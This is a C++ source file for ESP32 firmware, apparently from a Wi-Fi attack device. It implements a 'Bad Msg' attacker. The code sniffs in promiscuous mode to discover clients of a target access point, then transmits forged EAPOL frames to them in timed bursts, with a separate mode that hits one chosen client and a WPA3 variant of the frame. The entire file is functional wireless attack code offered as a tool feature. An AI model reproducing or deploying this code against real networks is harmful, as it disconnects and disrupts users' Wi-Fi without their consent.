#include "BadMsgAttacker.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h" // For RawFrames

// NEW: Constants to control the timing of the sniff/attack cycle
static const uint32_t SNIFF_DURATION_MS = 2500; // Sniff for 2.5 seconds
static const uint32_t ATTACK_DURATION_MS = 750;  // Attack for 0.75 seconds

BadMsgAttacker* BadMsgAttacker::instance_ = nullptr; // Define the static instance

BadMsgAttacker::BadMsgAttacker() 
    : app_(nullptr), stationSniffer_(nullptr), isActive_(false), isAttackPending_(false),
      packetCounter_(0), lastPacketTime_(0), currentPhase_(AttackPhase::SNIFFING), 
      lastPhaseSwitchTime_(0), currentClientIndex_(0) 
{
    instance_ = this;
}

void BadMsgAttacker::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

void BadMsgAttacker::prepareAttack(AttackType type) {
    if (isActive_) stop();
    isAttackPending_ = true;
    currentConfig_.type = type;
}

bool BadMsgAttacker::start(const WifiNetworkInfo& targetAp) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::TARGET_AP) return false;

    LOG(LogLevel::INFO, "BAD_MSG", "Starting dynamic TARGET_AP attack on %s", targetAp.ssid);
    currentConfig_.targetAp = targetAp;
    packetCounter_ = 0;
    currentClientIndex_ = 0;
    knownClients_.clear();

    isActive_ = true;
    isAttackPending_ = false;

    // Immediately switch to the first sniffing phase to discover clients
    switchToSniffPhase();
    return true;
}

bool BadMsgAttacker::start(const StationInfo& targetClient) {
    if (isActive_ || !isAttackPending_ || currentConfig_.type != AttackType::PINPOINT_CLIENT) return false;
    
    // Pinpoint mode does not need the dynamic cycle, so its logic remains simple.
    LOG(LogLevel::INFO, "BAD_MSG", "Starting PINPOINT attack.");

    currentConfig_.targetClient = targetClient;
    currentConfig_.targetAp.channel = targetClient.channel;
    memcpy(currentConfig_.targetAp.bssid, targetClient.ap_bssid, 6);

    bool ap_info_found = false;
    for (const auto& net : app_->getWifiManager().getScannedNetworks()) {
        if (memcmp(net.bssid, targetClient.ap_bssid, 6) == 0) {
            currentConfig_.targetAp.securityType = net.securityType;
            ap_info_found = true;
            break;
        }
    }
    if (!ap_info_found) {
        LOG(LogLevel::WARN, "BAD_MSG", "Could not find AP in scan results. Assuming WPA2.");
        currentConfig_.targetAp.securityType = WIFI_AUTH_WPA2_PSK;
    }

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to acquire RF lock for pinpoint attack.");
        return false;
    }
    
    isActive_ = true;
    isAttackPending_ = false;
    packetCounter_ = 0;
    return true;
}

void BadMsgAttacker::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "BAD_MSG", "Stopping Bad Msg attack.");
    isActive_ = false;
    isAttackPending_ = false;
    
    // Clean up regardless of the current phase
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    rfLock_.reset(); // This handles releasing the hardware lock.
}

void BadMsgAttacker::loop() {
    if (!isActive_) return;

    // Pinpoint mode has a simple loop, just keep attacking.
    if (currentConfig_.type == AttackType::PINPOINT_CLIENT) {
        if (millis() - lastPacketTime_ > 200) {
            lastPacketTime_ = millis();
            sendBadMsgPacket(currentConfig_.targetClient, currentConfig_.targetAp.securityType);
        }
        return;
    }

    // --- NEW State Machine for TARGET_AP mode ---
    if (currentPhase_ == AttackPhase::SNIFFING) {
        if (millis() - lastPhaseSwitchTime_ > SNIFF_DURATION_MS) {
            switchToAttackPhase();
        }
    } else { // ATTACKING phase
        if (millis() - lastPhaseSwitchTime_ > ATTACK_DURATION_MS) {
            switchToSniffPhase();
        } else {
            attackNextClient();
        }
    }
}

void BadMsgAttacker::switchToSniffPhase() {
    LOG(LogLevel::INFO, "BAD_MSG", false, "Switching to SNIFF phase.");
    rfLock_.reset(); // Release RAW_TX lock
    
    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to re-acquire PROMISCUOUS lock. Stopping.");
        stop();
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(currentConfig_.targetAp.channel, WIFI_SECOND_CHAN_NONE);
    
    currentPhase_ = AttackPhase::SNIFFING;
    lastPhaseSwitchTime_ = millis();
}

void BadMsgAttacker::switchToAttackPhase() {
    LOG(LogLevel::INFO, "BAD_MSG", false, "Switching to ATTACK phase. Known clients: %d", knownClients_.size());
    esp_wifi_set_promiscuous_rx_cb(nullptr); // IMPORTANT: Stop listening to packets
    rfLock_.reset(); // Release PROMISCUOUS lock

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_RAW_TX);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "BAD_MSG", "Failed to re-acquire RAW_TX lock. Stopping.");
        stop();
        return;
    }

    esp_wifi_set_channel(currentConfig_.targetAp.channel, WIFI_SECOND_CHAN_NONE);

    currentPhase_ = AttackPhase::ATTACKING;
    lastPhaseSwitchTime_ = millis();
    currentClientIndex_ = 0; // Start attacking from the beginning of the list
}

void BadMsgAttacker::attackNextClient() {
    if (knownClients_.empty()) return;

    if (millis() - lastPacketTime_ > 50) { // Send a burst to one client every 50ms
        lastPacketTime_ = millis();
        
        // Cycle through the list of known clients
        if (currentClientIndex_ >= (int)knownClients_.size()) {
            currentClientIndex_ = 0;
        }
        
        sendBadMsgPacket(knownClients_[currentClientIndex_], currentConfig_.targetAp.securityType);
        currentClientIndex_++;
    }
}

void BadMsgAttacker::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void BadMsgAttacker::handlePacket(wifi_promiscuous_pkt_t *packet) {
    // This packet handler is now only active during the SNIFFING phase of a TARGET_AP attack.
    const uint8_t *payload = packet->payload;
    const uint16_t frame_control = payload[0] | (payload[1] << 8);

    const bool to_ds = (frame_control >> 8) & 0x01;
    const bool from_ds = (frame_control >> 9) & 0x01;

    const uint8_t *bssid = nullptr;
    const uint8_t *client_mac = nullptr;

    if (!to_ds && from_ds) { bssid = payload + 10; client_mac = payload + 4; } 
    else if (to_ds && !from_ds) { bssid = payload + 4; client_mac = payload + 10; } 
    else { return; }

    // Check if the packet belongs to our target AP and is not a broadcast/multicast
    if (memcmp(bssid, currentConfig_.targetAp.bssid, 6) == 0 && !(client_mac[0] & 0x01)) {
        StationInfo newStation;
        memcpy(newStation.mac, client_mac, 6);

        bool found = false;
        for (const auto& st : knownClients_) {
            if (st == newStation) {
                found = true;
                break;
            }
        }

        if (!found) {
            memcpy(newStation.ap_bssid, bssid, 6);
            newStation.channel = currentConfig_.targetAp.channel;
            knownClients_.push_back(newStation);
            
            char macStr[18];
            sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
            LOG(LogLevel::INFO, "BAD_MSG", "Dynamically discovered new client: %s", macStr);
        }
    }
}

void BadMsgAttacker::sendBadMsgPacket(const StationInfo& client, uint8_t securityType) {
    // This function remains the same, but we add a log to confirm it's being called
    LOG(LogLevel::DEBUG, "BAD_MSG", false, "Sending EAPOL to %02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);

    uint8_t packet[sizeof(RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE)];
    memcpy(packet, RawFrames::Mgmt::BadMsg::EAPOL_TEMPLATE, sizeof(packet));
    size_t frame_size = sizeof(packet);

    memcpy(&packet[4], client.mac, 6);
    memcpy(&packet[10], client.ap_bssid, 6);
    memcpy(&packet[16], client.ap_bssid, 6);
    esp_fill_random(&packet[49], 32);

    for (uint8_t i = 0; i < 8; i++) {
        packet[41 + i] = (packetCounter_ >> (56 - i * 8)) & 0xFF;
    }
    
    if (securityType == WIFI_AUTH_WPA3_PSK || securityType == WIFI_AUTH_WPA2_WPA3_PSK || securityType == WIFI_AUTH_WPA3_ENT_192) {
        packet[35] = 0x5f; packet[38] = 0xCB; packet[39] = 0x00; packet[40] = 0x00; frame_size -= 22;
    }
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, packet, frame_size, false);
    if (result == ESP_OK) {
        packetCounter_++;
    } else {
        LOG(LogLevel::ERROR, "BAD_MSG", false, "esp_wifi_80211_tx failed! Error: %d", result);
    }
}

// Getters
bool BadMsgAttacker::isActive() const { return isActive_; }
const BadMsgAttacker::AttackConfig& BadMsgAttacker::getConfig() const { return currentConfig_; }
uint32_t BadMsgAttacker::getPacketCount() const { return packetCounter_; }
int BadMsgAttacker::getClientCount() const {
    return (currentConfig_.type == AttackType::PINPOINT_CLIENT) ? (isActive_ ? 1 : 0) : knownClients_.size();
}
bool BadMsgAttacker::isSniffing() const { 
    return (isActive_ && currentConfig_.type == AttackType::TARGET_AP && currentPhase_ == AttackPhase::SNIFFING);
}